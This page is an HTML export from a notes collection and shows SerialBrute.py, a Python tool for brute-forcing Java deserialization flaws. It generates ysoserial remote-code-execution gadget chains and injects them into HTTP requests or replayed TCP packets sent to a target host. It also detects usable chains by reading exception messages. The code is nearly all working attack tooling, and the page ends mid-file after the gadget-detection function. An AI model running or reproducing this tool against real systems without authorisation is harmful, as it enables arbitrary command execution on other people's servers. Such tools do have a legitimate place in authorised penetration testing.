<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SerialBrute.py</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">SerialBrute.py</h1><br/><div class="codebox"><div class="codebox"><span style="color:#0088ff;font-weight:400">############################################################</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;SerialBrute.py</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Java&nbsp;Serialization&nbsp;brute&nbsp;force&nbsp;attack&nbsp;tool.&nbsp;Generates</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;RCE&nbsp;gadget&nbsp;chains&nbsp;using&nbsp;ysoserial&nbsp;and&nbsp;injects&nbsp;them&nbsp;into</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;a&nbsp;HTTP&nbsp;request&nbsp;or&nbsp;series&nbsp;of&nbsp;TCP&nbsp;packets&nbsp;in&nbsp;order&nbsp;to&nbsp;aid</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;in&nbsp;the&nbsp;detection&nbsp;and&nbsp;exploitation&nbsp;of&nbsp;Java</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;deserialization&nbsp;vulnerabilities.</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;</span><br /><span style="color:#0088ff;font-weight:400">############################################################</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Usage:</span><br /><span style="color:#0088ff;font-weight:400">#	SerialBrute.py&nbsp;-r&nbsp;&lt;file&gt;&nbsp;-c&nbsp;&lt;command&gt;&nbsp;[opts]</span><br /><span style="color:#0088ff;font-weight:400">#	SerialBrute.py&nbsp;-p&nbsp;&lt;file&gt;&nbsp;-t&nbsp;&lt;host:port&gt;&nbsp;-c&nbsp;&lt;command&gt;&nbsp;[opts]</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Options:</span><br /><span style="color:#0088ff;font-weight:400">#	-r&nbsp;&lt;file&gt;&nbsp;To&nbsp;specify&nbsp;a&nbsp;file&nbsp;containing&nbsp;a&nbsp;HTTP&nbsp;request&nbsp;to&nbsp;inject&nbsp;payloads&nbsp;into</span><br /><span style="color:#0088ff;font-weight:400">#	-p&nbsp;&lt;file&gt;&nbsp;To&nbsp;specify&nbsp;a&nbsp;file&nbsp;containing&nbsp;TCP&nbsp;packets&nbsp;to&nbsp;inject&nbsp;payloads&nbsp;into</span><br /><span style="color:#0088ff;font-weight:400">#	-c&nbsp;&lt;command&gt;&nbsp;The&nbsp;operating&nbsp;system&nbsp;command&nbsp;to&nbsp;attempt&nbsp;to&nbsp;execute</span><br /><span style="color:#0088ff;font-weight:400">#	-t&nbsp;&lt;host:port&gt;&nbsp;The&nbsp;target&nbsp;for&nbsp;the&nbsp;attack,&nbsp;required&nbsp;with&nbsp;-p,&nbsp;optional&nbsp;with&nbsp;-r</span><br /><span style="color:#0088ff;font-weight:400">#	-g&nbsp;&lt;gadget&gt;&nbsp;The&nbsp;ysoserial&nbsp;gadget&nbsp;chain&nbsp;to&nbsp;use&nbsp;(if&nbsp;known,&nbsp;defaults&nbsp;to&nbsp;all&nbsp;if&nbsp;not&nbsp;specified)</span><br /><span style="color:#0088ff;font-weight:400">#	-dg&nbsp;Attempt&nbsp;to&nbsp;detect&nbsp;valid&nbsp;gadget&nbsp;chains&nbsp;by&nbsp;brute&nbsp;forcing&nbsp;with&nbsp;an&nbsp;invalid&nbsp;OS&nbsp;command&nbsp;and&nbsp;observing&nbsp;responses</span><br /><span style="color:#0088ff;font-weight:400">#	-n&nbsp;Pure&nbsp;kitchen&nbsp;sink&nbsp;mode,&nbsp;don't&nbsp;ask&nbsp;for&nbsp;confirmation&nbsp;of&nbsp;success&nbsp;in&nbsp;between&nbsp;attacks</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Input&nbsp;files:</span><br /><span style="color:#0088ff;font-weight:400">#	HTTP&nbsp;request&nbsp;input&nbsp;files&nbsp;should&nbsp;contain&nbsp;a&nbsp;single&nbsp;HTTP&nbsp;request&nbsp;with&nbsp;a&nbsp;marker&nbsp;indicating</span><br /><span style="color:#0088ff;font-weight:400">#	where&nbsp;to&nbsp;inject&nbsp;deserialization&nbsp;payloads.&nbsp;Use&nbsp;PAYLOAD&nbsp;to&nbsp;mark&nbsp;the&nbsp;location&nbsp;where&nbsp;a</span><br /><span style="color:#0088ff;font-weight:400">#	payload&nbsp;should&nbsp;be&nbsp;inserted,&nbsp;or&nbsp;PAYLOADNOHEADER&nbsp;if&nbsp;the&nbsp;payload&nbsp;should&nbsp;be&nbsp;inserted</span><br /><span style="color:#0088ff;font-weight:400">#	without&nbsp;the&nbsp;serialization&nbsp;header&nbsp;(0xAC&nbsp;ED&nbsp;00&nbsp;05).</span><br /><span style="color:#0088ff;font-weight:400">#	</span><br /><span style="color:#0088ff;font-weight:400">#	TCP&nbsp;replay&nbsp;input&nbsp;files&nbsp;should&nbsp;list&nbsp;the&nbsp;minimal&nbsp;set&nbsp;of&nbsp;TCP&nbsp;packets&nbsp;required&nbsp;to&nbsp;achieve</span><br /><span style="color:#0088ff;font-weight:400">#	object&nbsp;deserialization&nbsp;against&nbsp;the&nbsp;target.&nbsp;Each&nbsp;line&nbsp;of&nbsp;the&nbsp;file&nbsp;should&nbsp;contain&nbsp;one&nbsp;of</span><br /><span style="color:#0088ff;font-weight:400">#	the&nbsp;following:</span><br /><span style="color:#0088ff;font-weight:400">#		Hex-ascii&nbsp;encoded&nbsp;bytes&nbsp;of&nbsp;a&nbsp;packet&nbsp;to&nbsp;send&nbsp;to&nbsp;the&nbsp;target&nbsp;(e.g.&nbsp;aced000577020000)</span><br /><span style="color:#0088ff;font-weight:400">#		The&nbsp;string&nbsp;RECV&nbsp;to&nbsp;indicate&nbsp;that&nbsp;a&nbsp;response&nbsp;packet&nbsp;should&nbsp;be&nbsp;read&nbsp;from&nbsp;the&nbsp;server</span><br /><span style="color:#0088ff;font-weight:400">#	Insert&nbsp;PAYLOAD&nbsp;anywhere&nbsp;within&nbsp;an&nbsp;outbound&nbsp;packet&nbsp;line,&nbsp;or&nbsp;on&nbsp;a&nbsp;line&nbsp;on&nbsp;its&nbsp;own,&nbsp;to</span><br /><span style="color:#0088ff;font-weight:400">#	indicate&nbsp;where&nbsp;the&nbsp;payload&nbsp;should&nbsp;be&nbsp;inserted&nbsp;into&nbsp;the&nbsp;packet.&nbsp;Use&nbsp;PAYLOADNOHEADER&nbsp;to</span><br /><span style="color:#0088ff;font-weight:400">#	insert&nbsp;the&nbsp;payload&nbsp;without&nbsp;the&nbsp;serialization&nbsp;header&nbsp;(0xAC&nbsp;ED&nbsp;00&nbsp;05).</span><br /><span style="color:#0088ff;font-weight:400">#	E.g.</span><br /><span style="color:#0088ff;font-weight:400">#		aced000577020000</span><br /><span style="color:#0088ff;font-weight:400">#		RECV</span><br /><span style="color:#0088ff;font-weight:400">#		RECV</span><br /><span style="color:#0088ff;font-weight:400">#		PAYLOADNOHEADER</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;</span><br /><span style="color:#0088ff;font-weight:400">############################################################</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;See&nbsp;SrlBrt.py&nbsp;for&nbsp;a&nbsp;cut-down&nbsp;version&nbsp;that&nbsp;contains&nbsp;an</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;empty&nbsp;'deliverPayload'&nbsp;function&nbsp;that&nbsp;can&nbsp;be&nbsp;filled&nbsp;in&nbsp;to</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;attack&nbsp;arbitrary&nbsp;applications&nbsp;and&nbsp;protocols.</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;</span><br /><span style="color:#0088ff;font-weight:400">############################################################</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Written&nbsp;by&nbsp;Nicky&nbsp;Bloor&nbsp;(@NickstaDB)</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;</span><br /><span style="color:#0088ff;font-weight:400">############################################################</span><br /><span style="color:#333333;font-weight:400">import</span>&nbsp;os<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;socket<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;subprocess<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;sys<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;urllib<br /><br /><span style="color:#0088ff;font-weight:400">####################</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Configuration</span><br /><span style="color:#0088ff;font-weight:400">####################</span><br /><span style="color:#0088ff;font-weight:400">#Timeout&nbsp;in&nbsp;seconds&nbsp;for&nbsp;socket&nbsp;receive&nbsp;operations</span><br />RECV_TIMEOUT&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">1.0</span><br /><br /><span style="color:#0088ff;font-weight:400">#Amount&nbsp;of&nbsp;data&nbsp;to&nbsp;read&nbsp;in&nbsp;socket&nbsp;receive&nbsp;operations</span><br />RECV_SIZE&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">4096</span><br /><br /><span style="color:#0088ff;font-weight:400">#Ysoserial&nbsp;JAR&nbsp;path</span><br />YSOSERIAL_PATH&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"ysoserial.jar"</span><br /><br /><span style="color:#0088ff;font-weight:400">#Ysoserial&nbsp;JAR&nbsp;download&nbsp;URL</span><br />YSOSERIAL_URL&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar"</span><br /><br /><span style="color:#0088ff;font-weight:400">#All&nbsp;ysoserial&nbsp;RCE&nbsp;gadget&nbsp;chains</span><br />ALL_GADGETS&nbsp;=&nbsp;[<span style="color:#3ad900;font-weight:400">"BeanShell1"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"CommonsBeanutils1"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"CommonsCollections1"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"CommonsCollections2"</span>,<br />			&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"CommonsCollections3"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"CommonsCollections4"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"CommonsCollections5"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"CommonsCollections6"</span>,<br />			&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"Groovy1"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"JavassistWeld1"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"JBossInterceptors1"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"Jdk7u21"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"JSON1"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"MozillaRhino1"</span>,<br />			&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"ROME"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"Spring1"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"Spring2"</span><br />]<br /><br /><span style="color:#0088ff;font-weight:400">####################</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Default&nbsp;runtime&nbsp;settings</span><br /><span style="color:#0088ff;font-weight:400">####################</span><br />confirmAttacks&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">True</span><br />targetHost&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />targetPort&nbsp;=&nbsp;-<span style="color:#ff0044;font-weight:400">1</span><br />inputFile&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />cmd&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />gadgetChain&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />detectGadgets&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">False</span><br />attackmode&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br /><br /><span style="color:#0088ff;font-weight:400">####################</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Dispatch&nbsp;a&nbsp;payload&nbsp;via&nbsp;HTTP</span><br /><span style="color:#0088ff;font-weight:400">####################</span><br />def&nbsp;dispatchPayloadViaHttp(payload):<br />	global&nbsp;targetHost,&nbsp;targetPort,&nbsp;inputFile,&nbsp;RECV_TIMEOUT,&nbsp;RECV_SIZE<br />	<br />	<span style="color:#0088ff;font-weight:400">#Load&nbsp;the&nbsp;HTTP&nbsp;request&nbsp;from&nbsp;disk</span><br />	f&nbsp;=&nbsp;open(inputFile,&nbsp;<span style="color:#3ad900;font-weight:400">"rb"</span>)<br />	request&nbsp;=&nbsp;f.read()<br />	f.close()<br />	<br />	<span style="color:#0088ff;font-weight:400">#Check&nbsp;for&nbsp;a&nbsp;PAYLOADNOHEADER&nbsp;marker</span><br />	if&nbsp;<span style="color:#3ad900;font-weight:400">"PAYLOADNOHEADER"</span>&nbsp;in&nbsp;request:<br />		<span style="color:#0088ff;font-weight:400">#Replace&nbsp;the&nbsp;marker&nbsp;with&nbsp;the&nbsp;payload&nbsp;bytes&nbsp;minus&nbsp;the&nbsp;serialization&nbsp;header</span><br />		request&nbsp;=&nbsp;request.replace(<span style="color:#3ad900;font-weight:400">"PAYLOADNOHEADER"</span>,&nbsp;payload[<span style="color:#ff0044;font-weight:400">4</span>:])<br />	elif&nbsp;<span style="color:#3ad900;font-weight:400">"PAYLOAD"</span>&nbsp;in&nbsp;request:<br />		<span style="color:#0088ff;font-weight:400">#Replace&nbsp;the&nbsp;marker&nbsp;with&nbsp;the&nbsp;payload&nbsp;bytes</span><br />		request&nbsp;=&nbsp;request.replace(<span style="color:#3ad900;font-weight:400">"PAYLOAD"</span>,&nbsp;payload)<br />	else:<br />		<span style="color:#0088ff;font-weight:400">#Missing&nbsp;marker,&nbsp;bail</span><br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[-]&nbsp;ERROR:&nbsp;The&nbsp;HTTP&nbsp;request&nbsp;file&nbsp;did&nbsp;not&nbsp;contain&nbsp;the&nbsp;PAYLOAD&nbsp;or&nbsp;PAYLOADNOHEADER&nbsp;marker&nbsp;indicating&nbsp;the&nbsp;location&nbsp;where&nbsp;the&nbsp;payload&nbsp;should&nbsp;be&nbsp;injected."</span><br />		sys.exit(<span style="color:#ff0044;font-weight:400">1</span>)<br />	<br />	<span style="color:#0088ff;font-weight:400">#Check&nbsp;for&nbsp;a&nbsp;Content-Length&nbsp;header&nbsp;and&nbsp;fix&nbsp;it&nbsp;if&nbsp;necessary</span><br />	headers&nbsp;=&nbsp;request.split(<span style="color:#3ad900;font-weight:400">"\r\n\r\n"</span>)[<span style="color:#ff0044;font-weight:400">0</span>]<br />	if&nbsp;<span style="color:#3ad900;font-weight:400">"content-length:"</span>&nbsp;in&nbsp;headers.lower():<br />		<span style="color:#0088ff;font-weight:400">#Re-build&nbsp;the&nbsp;headers&nbsp;with&nbsp;a&nbsp;new&nbsp;content&nbsp;length&nbsp;header</span><br />		newHeaders&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />		for&nbsp;header&nbsp;in&nbsp;headers.split(<span style="color:#3ad900;font-weight:400">"\r\n"</span>):<br />			if&nbsp;header.lower().startswith(<span style="color:#3ad900;font-weight:400">"content-length:"</span>):<br />				newHeaders&nbsp;=&nbsp;newHeaders&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"Content-Length:&nbsp;"</span>&nbsp;+&nbsp;str(len(request.split(<span style="color:#3ad900;font-weight:400">"\r\n\r\n"</span>,<span style="color:#ff0044;font-weight:400">1</span>)[<span style="color:#ff0044;font-weight:400">1</span>]))&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"\r\n"</span><br />			else:<br />				newHeaders&nbsp;=&nbsp;newHeaders&nbsp;+&nbsp;header&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"\r\n"</span><br />		<br />		<span style="color:#0088ff;font-weight:400">#Re-build&nbsp;the&nbsp;request</span><br />		body&nbsp;=&nbsp;request.split(<span style="color:#3ad900;font-weight:400">"\r\n\r\n"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">1</span>)[<span style="color:#ff0044;font-weight:400">1</span>]<br />		request&nbsp;=&nbsp;newHeaders&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"\r\n"</span>&nbsp;+&nbsp;body<br />	<br />	<span style="color:#0088ff;font-weight:400">#Connect&nbsp;to&nbsp;the&nbsp;target</span><br />	sock&nbsp;=&nbsp;socket.socket(socket.AF_INET,&nbsp;socket.SOCK_STREAM)<br />	sock.connect((targetHost,&nbsp;targetPort))<br />	<br />	<span style="color:#0088ff;font-weight:400">#Send&nbsp;the&nbsp;payload</span><br />	sock.sendall(request)<br />	<br />	<span style="color:#0088ff;font-weight:400">#Attempt&nbsp;to&nbsp;read&nbsp;the&nbsp;response</span><br />	response&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />	try:<br />		sock.settimeout(RECV_TIMEOUT)<br />		response&nbsp;=&nbsp;sock.recv(RECV_SIZE)<br />	except:<br />		pass<br />	<br />	<span style="color:#0088ff;font-weight:400">#Close&nbsp;the&nbsp;connection</span><br />	sock.close()<br />	<br />	<span style="color:#0088ff;font-weight:400">#Return&nbsp;the&nbsp;response&nbsp;(if&nbsp;one&nbsp;was&nbsp;received)</span><br />	return&nbsp;response<br /><br /><span style="color:#0088ff;font-weight:400">####################</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Dispatch&nbsp;a&nbsp;payload&nbsp;by&nbsp;replaying&nbsp;TCP&nbsp;packets</span><br /><span style="color:#0088ff;font-weight:400">####################</span><br />def&nbsp;dispatchPayloadViaTcpReplay(payload):<br />	global&nbsp;targetHost,&nbsp;targetPort,&nbsp;inputFile,&nbsp;RECV_TIMEOUT,&nbsp;RECV_SIZE<br />	<br />	<span style="color:#0088ff;font-weight:400">#Open&nbsp;the&nbsp;input&nbsp;file</span><br />	f&nbsp;=&nbsp;open(inputFile,&nbsp;<span style="color:#3ad900;font-weight:400">"r"</span>)<br />	<br />	<span style="color:#0088ff;font-weight:400">#Connect&nbsp;to&nbsp;the&nbsp;target</span><br />	sock&nbsp;=&nbsp;socket.socket(socket.AF_INET,&nbsp;socket.SOCK_STREAM)<br />	sock.connect((targetHost,&nbsp;targetPort))<br />	<br />	<span style="color:#0088ff;font-weight:400">#Set&nbsp;a&nbsp;recv&nbsp;timeout&nbsp;on&nbsp;the&nbsp;socket</span><br />	sock.settimeout(RECV_TIMEOUT)<br />	<br />	<span style="color:#0088ff;font-weight:400">#Read&nbsp;the&nbsp;file&nbsp;line-by-line&nbsp;and&nbsp;dispatch&nbsp;packets&nbsp;accordingly</span><br />	for&nbsp;packet&nbsp;in&nbsp;f:<br />		<span style="color:#0088ff;font-weight:400">#Strip&nbsp;whitespace</span><br />		packet&nbsp;=&nbsp;packet.strip()<br />		<br />		<span style="color:#0088ff;font-weight:400">#Check&nbsp;for&nbsp;PAYLOADNOHEADER&nbsp;marker</span><br />		if&nbsp;<span style="color:#3ad900;font-weight:400">"PAYLOADNOHEADER"</span>&nbsp;in&nbsp;packet:<br />			<span style="color:#0088ff;font-weight:400">#Replace&nbsp;the&nbsp;marker&nbsp;with&nbsp;the&nbsp;ascii-hex&nbsp;encoded&nbsp;payload&nbsp;(minus&nbsp;the&nbsp;serialization&nbsp;header),&nbsp;then&nbsp;decode&nbsp;the&nbsp;lot&nbsp;and&nbsp;send&nbsp;it&nbsp;to&nbsp;the&nbsp;target</span><br />			sock.sendall(<br />				packet.replace(<span style="color:#3ad900;font-weight:400">"PAYLOADNOHEADER"</span>,&nbsp;payload[<span style="color:#ff0044;font-weight:400">4</span>:].encode(<span style="color:#3ad900;font-weight:400">"hex"</span>)).decode(<span style="color:#3ad900;font-weight:400">"hex"</span>)<br />			)<br />			<br />			<span style="color:#0088ff;font-weight:400">#Payload&nbsp;sent,&nbsp;break&nbsp;out&nbsp;of&nbsp;this&nbsp;loop</span><br />			break<br />		<span style="color:#0088ff;font-weight:400">#Not&nbsp;found,&nbsp;check&nbsp;for&nbsp;PAYLOAD&nbsp;marker</span><br />		elif&nbsp;<span style="color:#3ad900;font-weight:400">"PAYLOAD"</span>&nbsp;in&nbsp;packet:<br />			<span style="color:#0088ff;font-weight:400">#Replace&nbsp;the&nbsp;marker&nbsp;with&nbsp;the&nbsp;ascii-hex&nbsp;encoded&nbsp;payload,&nbsp;then&nbsp;decode&nbsp;the&nbsp;whole&nbsp;lot&nbsp;and&nbsp;send&nbsp;it&nbsp;to&nbsp;the&nbsp;target</span><br />			sock.sendall(<br />				packet.replace(<span style="color:#3ad900;font-weight:400">"PAYLOAD"</span>,&nbsp;payload.encode(<span style="color:#3ad900;font-weight:400">"hex"</span>)).decode(<span style="color:#3ad900;font-weight:400">"hex"</span>)<br />			)<br />			<br />			<span style="color:#0088ff;font-weight:400">#Payload&nbsp;sent,&nbsp;break&nbsp;out&nbsp;of&nbsp;this&nbsp;loop</span><br />			break<br />		<span style="color:#0088ff;font-weight:400">#Check&nbsp;if&nbsp;we&nbsp;need&nbsp;to&nbsp;receive&nbsp;a&nbsp;packet...</span><br />		elif&nbsp;<span style="color:#3ad900;font-weight:400">"RECV"</span>&nbsp;in&nbsp;packet:<br />			<span style="color:#0088ff;font-weight:400">#Receive&nbsp;a&nbsp;packet&nbsp;from&nbsp;the&nbsp;server</span><br />			try:<br />				sock.recv(RECV_SIZE)<br />			except&nbsp;socket.timeout:<br />				<span style="color:#0088ff;font-weight:400">#Recv&nbsp;timed&nbsp;out</span><br />				<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[-]&nbsp;Socket&nbsp;recv&nbsp;timed&nbsp;out."</span><br />				sock.close()<br />				f.close()<br />				sys.exit(<span style="color:#ff0044;font-weight:400">1</span>)<br />		<span style="color:#0088ff;font-weight:400">#Blank&nbsp;line,&nbsp;do&nbsp;nothing...</span><br />		elif&nbsp;packet&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">""</span>:<br />			continue<br />		<span style="color:#0088ff;font-weight:400">#Not&nbsp;a&nbsp;payload&nbsp;packet,&nbsp;not&nbsp;a&nbsp;receive&nbsp;instruction,&nbsp;hex-decode&nbsp;the&nbsp;packet&nbsp;and&nbsp;send&nbsp;it&nbsp;to&nbsp;the&nbsp;server</span><br />		else:<br />			sock.sendall(<br />				packet.decode(<span style="color:#3ad900;font-weight:400">"hex"</span>)<br />			)<br />	<br />	<span style="color:#0088ff;font-weight:400">#Attempt&nbsp;to&nbsp;receive&nbsp;a&nbsp;response&nbsp;packet</span><br />	response&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />	try:<br />		response&nbsp;=&nbsp;sock.recv(RECV_SIZE)<br />	except&nbsp;socket.timeout:<br />		pass<br />	<br />	<span style="color:#0088ff;font-weight:400">#Close&nbsp;the&nbsp;connection</span><br />	sock.close()<br />	<br />	<span style="color:#0088ff;font-weight:400">#Close&nbsp;the&nbsp;input&nbsp;file</span><br />	f.close()<br />	<br />	<span style="color:#0088ff;font-weight:400">#Return&nbsp;the&nbsp;response&nbsp;if&nbsp;one&nbsp;was&nbsp;received</span><br />	return&nbsp;response<br /><br /><span style="color:#0088ff;font-weight:400">####################</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Launch&nbsp;a&nbsp;payload&nbsp;and&nbsp;attempt&nbsp;to&nbsp;confirm&nbsp;whether&nbsp;the&nbsp;POP&nbsp;chain&nbsp;works&nbsp;or&nbsp;not.</span><br /><span style="color:#0088ff;font-weight:400">####################</span><br />def&nbsp;launchAttack(payload):<br />	global&nbsp;attackmode<br />	<br />	<span style="color:#0088ff;font-weight:400">#Dispatch&nbsp;the&nbsp;payload&nbsp;depending&nbsp;on&nbsp;the&nbsp;attack&nbsp;mode&nbsp;and&nbsp;get&nbsp;the&nbsp;response</span><br />	response&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />	if&nbsp;attackmode&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"http"</span>:<br />		response&nbsp;=&nbsp;dispatchPayloadViaHttp(payload)<br />	elif&nbsp;attackmode&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"tcpreplay"</span>:<br />		response&nbsp;=&nbsp;dispatchPayloadViaTcpReplay(payload)<br />	<br />	<span style="color:#0088ff;font-weight:400">#Check&nbsp;for&nbsp;ClassNotFound&nbsp;exceptions&nbsp;in&nbsp;the&nbsp;response</span><br />	if&nbsp;<span style="color:#3ad900;font-weight:400">"ClassNotFoundException"</span>&nbsp;in&nbsp;response:<br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;[-]&nbsp;POP&nbsp;gadget&nbsp;chain&nbsp;not&nbsp;supported."</span><br />	elif&nbsp;<span style="color:#3ad900;font-weight:400">"java.io.IOException:&nbsp;Cannot&nbsp;run&nbsp;program"</span>&nbsp;in&nbsp;response:<br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;[+]&nbsp;POP&nbsp;gadget&nbsp;chain&nbsp;is&nbsp;supported"</span><br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;[-]&nbsp;Requested&nbsp;command&nbsp;is&nbsp;not&nbsp;available"</span><br />	else:<br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;[+]&nbsp;POP&nbsp;gadget&nbsp;chain&nbsp;may&nbsp;be&nbsp;supported."</span><br /><br /><span style="color:#0088ff;font-weight:400">####################</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Attempt&nbsp;to&nbsp;detect&nbsp;available&nbsp;POP&nbsp;gadget&nbsp;chains&nbsp;by&nbsp;brute&nbsp;forcing&nbsp;with&nbsp;an&nbsp;invalid&nbsp;command&nbsp;string</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;A&nbsp;ClassNotFoundException&nbsp;in&nbsp;the&nbsp;response&nbsp;indicates&nbsp;that&nbsp;a&nbsp;class&nbsp;we&nbsp;attempted&nbsp;to&nbsp;deserialize&nbsp;isn't</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;present&nbsp;on&nbsp;the&nbsp;server&nbsp;and&nbsp;so&nbsp;that&nbsp;gadget&nbsp;chain&nbsp;cannot&nbsp;be&nbsp;used.&nbsp;A&nbsp;lack&nbsp;of&nbsp;this&nbsp;exception&nbsp;indicates</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;that&nbsp;the&nbsp;gadget&nbsp;chain&nbsp;may&nbsp;be&nbsp;usable.</span><br /><span style="color:#0088ff;font-weight:400">####################</span><br />def&nbsp;doGadgetDetection():<br />	global&nbsp;attackmode,&nbsp;YSOSERIAL_PATH,&nbsp;ALL_GADGETS<br />	<br />	<span style="color:#0088ff;font-weight:400">#Gadgets&nbsp;to&nbsp;return</span><br />	retGadgets&nbsp;=&nbsp;[]<br />	<br />	<span style="color:#0088ff;font-weight:400">#Attempt&nbsp;to&nbsp;detect&nbsp;available&nbsp;gadgets</span><br />	for&nbsp;g&nbsp;in&nbsp;ALL_GADGETS:<br />		with&nbsp;open(os.devnull,&nbsp;<span style="color:#3ad900;font-weight:400">"w"</span>)&nbsp;<span style="color:#333333;font-weight:400">as</span>&nbsp;FNULL:<br />			payload&nbsp;=&nbsp;subprocess.check_output([<span style="color:#3ad900;font-weight:400">"java"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"-jar"</span>,&nbsp;YSOSERIAL_PATH,&nbsp;g,&nbsp;<span style="color:#3ad900;font-weight:400">"SerialBruteGadgetDetector"</span>],&nbsp;stderr=FNULL)<br />		response&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />		if&nbsp;attackmode&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"http"</span>:<br />			response&nbsp;=&nbsp;dispatchPayloadViaHttp(payload)<br />		elif&nbsp;attackmode&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"tcpreplay"</span>:<br />			response&nbsp;=&nbsp;dispatchPayloadViaTcpReplay(payload)<br />		<br />		<span style="color:#0088ff;font-weight:400">#Check&nbsp;for&nbsp;a&nbsp;lack&nbsp;of&nbsp;ClassNotFoundException&nbsp;in&nbsp;the&nbsp;response</span><br />		if&nbsp;<span style="color:#3ad900;font-weight:400">"ClassNotFoundException"</span>&nbsp;not&nbsp;in&nbsp;response:<br />			<span style="color:#0088ff;font-weight:400">#Potential&nbsp;gadget&nbsp;chain&nbsp;identified</span><br />			retGadgets.append(g)<br />	<br />	<span style="color:#0088ff;font-weight:400">#Return&nbsp;the&nbsp;list&nbsp;of&nbsp;potential&nbsp;gadgets</span><br />	return&nbsp;retGadgets<br /><br /><span 